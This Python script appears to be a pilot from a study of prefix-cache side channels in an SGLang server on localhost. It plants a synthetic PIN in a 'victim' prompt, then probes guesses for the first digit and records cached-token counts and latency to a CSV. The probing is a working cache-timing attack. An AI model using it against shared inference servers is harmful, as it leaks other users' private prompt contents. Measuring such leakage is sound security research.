"""
run_pin_position1_pilot_v2.py - Level 3 pilot v2.

v1 (run_pin_position1_pilot.py) failed to show any signal because the
tokenizer merges consecutive digits into multi-character tokens (e.g.
"300000" -> ['300','000']), so the position-1 digit was not isolated as
its own token and cached_tokens stayed flat across all probes.

Fix: comma-separate every digit ("3,0,0,0,0,0"). Verified via direct
tokenizer inspection that this produces identical token counts (13) and
identical tokens at every position except the probed digit's own token.

Still position 1 only, still a 5-trial pilot. Isolated-probe methodology
(flush before every single probe) unchanged from v1.
"""
import csv
import sys
import os
import time
import random
import requests

sys.path.insert(0, os.path.dirname(__file__))
from measure import send_request
from config import SHARED_PUBLIC_PREFIX, PIN_LENGTH, PIN_LABEL, PIN_SEPARATOR

OUT_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "results", "sglang", "pin_position1_pilot_v2.csv"))
FLUSH_URL = "http://localhost:30000/flush_cache"
N_TRIALS = 30
GAP_SECONDS = 1
PLACEHOLDER_DIGIT = "0"

def flush_cache():
    r = requests.post(FLUSH_URL, timeout=10)
    return r.text.strip()

def format_pin(digits: str) -> str:
    return PIN_SEPARATOR.join(list(digits))

def random_pin():
    return "".join(str(random.randint(0, 9)) for _ in range(PIN_LENGTH))

def victim_populate(pin_digits: str):
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(pin_digits)
    return send_request(prompt)

def attacker_probe_position1(digit_guess: str):
    guess_digits = digit_guess + PLACEHOLDER_DIGIT * (PIN_LENGTH - 1)
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits)
    return send_request(prompt)

def run():
    rows = []

    for trial in range(N_TRIALS):
        gt_pin = random_pin()
        gt_digit1 = gt_pin[0]

        for digit in "0123456789":
            flush_cache()
            time.sleep(0.3)

            victim_populate(gt_pin)
            time.sleep(GAP_SECONDS)

            r = attacker_probe_position1(digit)
            r.update({
                "trial": trial,
                "probed_digit": digit,
                "ground_truth_pin": gt_pin,
                "ground_truth_digit1": gt_digit1,
            })
            rows.append(r)
            match = "MATCH" if digit == gt_digit1 else ""
            print(f"  trial={trial} probe_digit={digit} cached_tokens={r['cached_tokens']}/{r['prompt_tokens']} "
                  f"latency={r['wall_clock_latency']:.4f}s {match}")

    os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
    fieldnames = list(rows[0].keys())
    with open(OUT_PATH, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    print(f"\nSaved {len(rows)} rows to {OUT_PATH}")

if __name__ == "__main__":
    run()
